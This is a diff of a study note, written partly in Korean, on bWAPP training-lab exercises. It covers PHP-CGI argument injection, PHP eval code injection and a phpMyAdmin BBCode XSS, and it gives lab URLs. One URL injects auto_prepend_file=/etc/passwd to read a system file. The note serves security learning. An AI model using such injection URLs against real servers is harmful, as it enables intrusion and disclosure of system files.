@@ -17,3 +17,13 @@ http://59.23.133.107/bWAPP/admin/?-s
 http://59.23.133.107/bWAPP/admin/?-d+auto_prepend_file%3d/etc/passwd
 ![[Pasted image 20241015095033.png]]
 # PHP Eval Function
+![[Pasted image 20241015101445.png]]
+- code 인젝션과 같다.
+
+# phpMyAdmin [[BBCode]] Tag XSS
+![[Pasted image 20241015101748.png]]
+![[Pasted image 20241015101927.png]]
+http://59.23.133.107/phpmyadmin/error.php
+![[Pasted image 20241015102008.png]]
+http://59.23.133.107/phpmyadmin/error.php?error=a
+![[Pasted image 20241015102214.png]]
